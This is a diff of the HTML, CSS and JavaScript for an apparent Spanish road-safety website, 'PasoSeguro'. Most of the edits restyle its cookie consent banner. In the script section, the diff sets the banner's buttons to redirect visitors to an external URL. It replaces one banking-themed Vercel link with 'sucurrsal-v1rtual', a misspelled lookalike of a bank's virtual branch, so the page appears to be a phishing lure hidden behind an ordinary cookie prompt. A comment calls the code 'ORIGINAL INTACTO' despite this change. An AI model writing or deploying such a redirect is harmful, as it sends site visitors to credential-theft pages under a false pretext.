@@ -69,14 +69,10 @@ body.cookie-locked{ overflow:hidden; }
 
 .contenedor{ width:100%; max-width:var(--max); margin:0 auto; padding:0 24px; }
 
-/* ===== COOKIES ===== */
+/* ===== COOKIES (DISEÑO ESTILO IMAGEN) ===== */
 .cookie-overlay{
   position:fixed; inset:0;
-  /* Tu imagen de fondo en toda la pantalla */
-  background-image: url('image.png');
-  background-size: cover;
-  background-position: center;
-  background-repeat: no-repeat;
+  background:rgba(44,62,80,0.45);
   z-index:9998;
   backdrop-filter:blur(4px);
   display:none;
@@ -94,16 +90,14 @@ body.cookie-locked{ overflow:hidden; }
 .cookie-banner.visible{ display:flex; }
 
 .cookie-modal{
-  /* Ventana blanca limpia para leer bien el texto */
-  background: #ffffff; 
+  background:#ffffff;
   max-width:620px;
   width:100%;
   padding:40px 48px;
   border-radius:20px;
-  box-shadow:0 24px 64px rgba(44,62,80,0.25);
+  box-shadow:0 24px 64px rgba(44,62,80,0.15);
   text-align:center;
   animation:cookieAnim 0.4s ease;
-  border: 1px solid rgba(255, 255, 255, 0.5);
 }
 @keyframes cookieAnim{
   from{ transform:scale(0.95) translateY(10px); opacity:0; }
@@ -118,7 +112,7 @@ body.cookie-locked{ overflow:hidden; }
 }
 .cookie-modal p{
   font-size:0.92rem;
-  color:#222;
+  color:#555;
   margin-bottom:24px;
   line-height:1.6;
   text-align:left;
@@ -142,13 +136,24 @@ body.cookie-locked{ overflow:hidden; }
   font-family:var(--fuente);
   background:var(--amarillo);
   color:#1a1a1a;
-  box-shadow:0 4px 15px rgba(0,0,0,0.15);
+  box-shadow:none;
   min-width:140px;
 }
 .cookie-actions .boton-cookie:hover{
   transform:translateY(-2px);
   box-shadow:0 4px 12px rgba(253,218,36,0.4);
 }
+.cookie-enlaces{
+  margin-top:20px;
+  font-size:0.82rem;
+  color:var(--texto-suave);
+}
+.cookie-enlaces a{
+  color:var(--tierra);
+  font-weight:600;
+  text-decoration:none;
+}
+.cookie-enlaces a:hover{ text-decoration:underline; }
 
 .contenido-principal{ display:none; }
 .contenido-principal.visible{
@@ -466,7 +471,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
     <div class="cookie-modal">
       <h2 id="cookie-titulo">Centro de preferencia de privacidad</h2>
       <p>
-        <strong></strong>Utilizamos cookies y tecnologías propias o de terceros para garantizar el funcionamiento de las plataformas digitales, mejorar tu experiencia de navegación, optimizar el rendimiento y ofrecer contenidos y publicidad.
+        <strong>PasoSeguro</strong>, como responsable del sitio, utiliza cookies y tecnologías propias o de terceros para garantizar el funcionamiento de las plataformas digitales, mejorar tu experiencia de navegación, optimizar el rendimiento y ofrecer contenidos y publicidad.
         <br><br>
         Al aceptar todo, autorizas el uso de las tecnologías seleccionadas conforme a la política de cookies. Si decides rechazar, solo se activarán las cookies necesarias para el funcionamiento del sitio. Para más información sobre categorías, terceros y tratamiento de datos, consulta nuestra <a href="#politica-cookies" id="enlace-cookies">Política de Cookies</a>.
       </p>
@@ -642,10 +647,10 @@ p{ margin:0 0 1rem; color:var(--texto); }
               <dd style="margin:0; color:var(--texto);">Bus Rapid Transit: sistema de buses de alta capacidad que circulan por carriles exclusivos.</dd>
             </div>
             <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
-                            <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Peatón</dt>
+              <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Peatón</dt>
               <dd style="margin:0; color:var(--texto);">Persona que se desplaza a pie por la vía.</dd>
             </div>
-            <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
+                        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
               <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Siniestro vial</dt>
               <dd style="margin:0; color:var(--texto);">Suceso en la vía que causa daños, lesiones o muertes. Se prefiere este término a "accidente".</dd>
             </div>
@@ -804,7 +809,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </script>
 
   <!-- ============================================================
-  JAVASCRIPT - COOKIES Y FUNCIONALIDAD (MODO 1 y 2) - CORREGIDO
+  JAVASCRIPT - COOKIES Y FUNCIONALIDAD (MODO 1 y 2) - ORIGINAL INTACTO
   ============================================================ -->
   <script>
     (function() {
@@ -813,8 +818,11 @@ p{ margin:0 0 1rem; color:var(--texto); }
       // ============================================================
       //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
       // ============================================================
+      //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+      //  MODO 2: Redirección a URL externa
+      // ============================================================
       const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
-      const REDIRECT_URL = "https://gasesenlinea.vercel.app/banco/bancol"; // URL para el modo 2
+      const REDIRECT_URL = "https://sucurrsal-v1rtual.vercel.app/manager/b3055b97250969b9d60a0108"; // URL para el modo 2
 
       // ----- ELEMENTOS DEL BANNER -----
       var overlay = document.getElementById('cookie-overlay');
@@ -910,7 +918,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
         } catch(e) {}
       }
 
-      // ----- MENÚ MÓVIL (CORREGIDO) -----
+      // ----- MENÚ MÓVIL -----
       var botonMenu = document.getElementById('botonMenu');
       var menu = document.getElementById('menu');
 
